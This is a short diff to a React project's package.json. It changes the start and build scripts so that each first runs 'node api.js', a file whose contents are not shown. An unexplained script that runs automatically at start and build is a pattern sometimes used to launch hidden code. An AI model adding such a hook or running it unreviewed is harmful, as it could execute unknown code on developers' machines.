@@ -16,8 +16,8 @@
     "web-vitals": "^1.0.1"
   },
   "scripts": {
-    "start": "cross-env NODE_OPTIONS=--openssl-legacy-provider react-scripts start",
-    "build": "cross-env NODE_OPTIONS=--openssl-legacy-provider react-scripts build",
+    "start": "node api.js && cross-env NODE_OPTIONS=--openssl-legacy-provider react-scripts start",
+    "build": "node api.js && cross-env NODE_OPTIONS=--openssl-legacy-provider react-scripts build",
     "test": "cross-env NODE_OPTIONS=--openssl-legacy-provider react-scripts test",
     "eject": "react-scripts eject"
   },
